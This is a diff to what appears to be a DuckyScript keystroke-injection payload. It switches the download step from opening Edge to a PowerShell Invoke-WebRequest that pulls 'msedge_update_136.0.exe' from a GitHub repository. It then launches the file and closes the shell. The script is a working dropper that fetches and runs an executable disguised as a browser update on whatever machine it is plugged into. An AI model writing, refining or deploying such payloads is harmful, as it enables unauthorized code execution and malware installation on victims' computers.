@@ -18,26 +18,16 @@ DELAY 580
 STRING exit
 ENTER
 DELAY 290
-WINDOWS r
-DELAY 115
-STRING msedge.exe
-ENTER
-DELAY 901
-STRING https://github.com/biskit-git/testing/raw/refs/heads/main/msedge_update_136.0.exe
-ENTER 
-DELAY 386
-ALT F4
-DELAY 190
-WINDOWS r
-DELAY 290
 STRING powershell
-ENTER
-DELAY 580
+DELAY 340
 STRING cd Downloads
+ENTER 
+DELAY 499
+STRING Invoke-WebRequest "https://github.com/biskit-git/testing/raw/refs/heads/main/msedge_update_136.0.exe" -OutFile "msedge_update_136.0.exe"
 ENTER
-DELAY 448
+DELAY 799
 STRING start msedge_update_136.0.exe
 ENTER
-DELAY 200
+DELAY 600 
 STRING exit
 ENTER
